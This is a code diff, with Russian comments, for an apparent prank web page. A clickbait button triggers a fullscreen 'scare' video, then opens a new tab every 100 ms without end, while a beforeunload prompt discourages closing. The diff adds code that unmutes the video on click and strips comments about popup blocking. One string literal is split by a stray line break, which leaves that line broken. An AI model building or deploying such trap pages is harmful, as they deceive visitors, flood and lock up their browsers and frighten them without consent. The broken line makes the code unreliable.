@@ -98,7 +98,7 @@
     const clickbaitContainer = document.getElementById("clickbait-container");
     const scareVideoContainer = document.getElementById("scare-video-container");
 
-    // === Отладочные логи: Проверяем, найдены ли элементы ===
+    // Отладочные логи: Проверяем, найдены ли элементы
     console.log("Элементы:");
     console.log("video:", video);
     console.log("startButton:", startButton);
@@ -112,9 +112,16 @@
         return 'Ваши данные могут не сохраниться, точно закрыть?';
     });
 
-    // Функция для запроса полноэкранного режима
-    function requestFullscreen() {
-        console.log("Attempting to request fullscreen.");
+    // Функция для запроса полноэкранного режима и разглушения видео
+    function requestFullscreenAndUnmute() {
+        console.log("Attempting to request fullscreen and unmute.");
+        
+        // Если видео заглушено, разглушаем его при пользовательском клике
+        if (video.muted) {
+            video.muted = false;
+            console.log("Video unmuted by user interaction.");
+        }
+
         const { documentElement } = document;
         if(documentElement.requestFullscreen) {
             documentElement.requestFullscreen();
@@ -130,9 +137,6 @@
     // Функция для открытия новой вкладки
     function openNewTab() {
         console.log("Attempting to open new tab:", targetUrl);
-        // Большинство браузеров блокируют window.open, если оно не вызвано напрямую
-        // пользовательским взаимодействием. setInterval почти всегда будет блокироваться.
-        // Пользователь увидит сообщение о блокировке всплывающих окон.
         window.open(targetUrl, '_blank');
     }
 
@@ -148,46 +152,44 @@
 
         // === ВАЖНО: Принудительно заглушаем видео для автоплея ===
         video.muted = true; 
-        // Добавлен атрибут playsinline в HTML для iOS устройств, чтобы видео воспроизводилось в рамках окна
         
         // Запускаем видео
         video.play()
             .then(() => {
-                console.log("Video playback started successfully.");
+                console.log("Video playback started successfully (muted).");
                 // Запрашиваем полноэкранный режим после успешного старта видео
-                requestFullscreen();
+                // Этот programmatic вызов requestFullscreenAndUnmute может не разглушить видео
+                // из-за политик браузера, но он попытается войти в фуллскрин.
+                // Разглушение гарантировано при *последующем* клике по видео.
+                requestFullscreenAndUnmute(); 
             })
             .catch(error => {
                 console.error("Autoplay failed:", error);
-                // Если автоплей заблокирован, можно показать сообщение или кнопку "Play"
-                // В этом случае полноэкранный режим также может быть заблокирован.
                 alert("Не удалось запустить видео автоматически. Пожалуйста, кликните по экрану.");
             });
         
         // Начинаем открывать вкладки через секунду после загрузки
         setTimeout(() => {
             console.log("Starting to open new tabs after 1 second...");
-            // Открываем новые вкладки каждые 100мс бесконечно
-            // Важно: Эти вкладки, скорее всего, будут заблокированы браузером
-            // как всплывающие окна, и пользователь увидит предупреждение.
             setInterval(openNewTab, 100);
-        },
-1000);
+        }, 1000);
     }
 
     // Добавляем обработчик события для "кликбейт" кнопки
     if (startButton) {
         startButton.addEventListener('click', startScareSequence);
-        console.log("Event listener added to startButton.");
+        console.log("Event listener added to sta
+rtButton.");
     } else {
         console.error("startButton not found!");
     }
 
-    // Добавляем обработчик события для видео, чтобы при клике на него
-    // можно было снова запросить полноэкранный режим (если пользователь вышел)
+    // Добавляем обработчик события для видео: при клике на него
+    // будет попытка войти в полноэкранный режим и разглушить видео.
+    // Этот клик считается пользовательским взаимодействием.
     if (video) {
-        video.addEventListener("click", requestFullscreen);
-        console.log("Event listener added to video for fullscreen.");
+        video.addEventListener("click", requestFullscreenAndUnmute);
+        console.log("Event listener added to video for fullscreen and unmute.");
     } else {
         console.error("video element not found!");
     }
